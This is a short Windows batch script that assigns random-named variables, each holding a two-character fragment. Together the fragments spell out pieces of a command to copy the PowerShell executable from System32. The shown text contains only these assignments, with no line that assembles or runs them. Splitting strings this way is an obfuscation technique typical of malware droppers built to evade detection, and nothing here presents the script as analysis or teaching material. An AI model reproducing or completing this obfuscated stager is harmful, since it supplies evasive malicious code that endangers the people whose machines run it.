@echo off
set "XsiUmWDsnS=.e"
set "DxtONXEFeI=do"
set "FskaCEwHIy=he"
set "RaktbthSSN=xe"
set "fELRNfPdoh=ll"
set "fPOIrACbSb= C"
set "swfHfMUsKl=he"
set "TOHIBDRYlF=co"
set "ipGXUWPsez=0\"
set "VcgWtEXpwa=we"
set "hVZIMYzdxp=ws"
set "HxruOySSXi=Wi"
set "VVlbVZokvj=y "
set "SeTZZVPIxB=ll"
set "OjMzEHxtTT=s\"
set "ZeEafxDkzm=py"
set "ABjRFvqguF=rS"
set "DJdxZSrhFN=st"
set "JYbMgpSZTn=Po"
set "qqOgDfvIql=in"
set "pDovtPnByw=em"
set "nJJzZLDJCS=rs"
set "bqekXegozM=\W"
set "ZZadedZZra=nd"
set "YMFoHCRftO=1."
